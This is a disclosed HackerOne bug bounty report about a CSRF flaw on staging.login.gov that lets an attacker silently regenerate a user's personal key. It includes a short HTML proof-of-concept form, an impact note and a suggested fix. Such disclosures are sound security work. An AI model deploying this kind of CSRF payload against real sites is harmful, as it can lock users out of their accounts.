# CSRF in generating a new Personal Key

## Report Details
- **Report ID**: 263512
- **URL**: https://hackerone.com/reports/263512
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-26T05:40:08.032Z
- **Disclosed**: 2017-11-17T17:37:14.865Z

## Reporter
- **Username**: streaak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Hello team,
I would like to report a CSRF which would allow an attacker to change a user's personal key.

**Vulnerable URL-**
staging.login.gov

**POC-**

Use the following HTML form for performing the CSRF attack-

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://staging.login.gov/manage/personal_key">
      <input type="hidden" name="resend" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

This will redirect you to https://staging.login.gov/manage/personal_key?resend=true and we can use the key on the screen to login as the old key will be rendered invalid.

PS- The user doesn't have to click on continue on the above page. The key would be changed either way. You can logout and login and test the new key and you will be successfully logged into the account.

**IMPACT-**
This will pretty much deny a user to login to his system who has "his device stolen or accounts hacked" as mentioned by your policy.

**FIX-**
Add a CSRF token while submitting the form.

Let me know if you need anything else.

Best regards,
Streaak2





## Attachments
No attachments
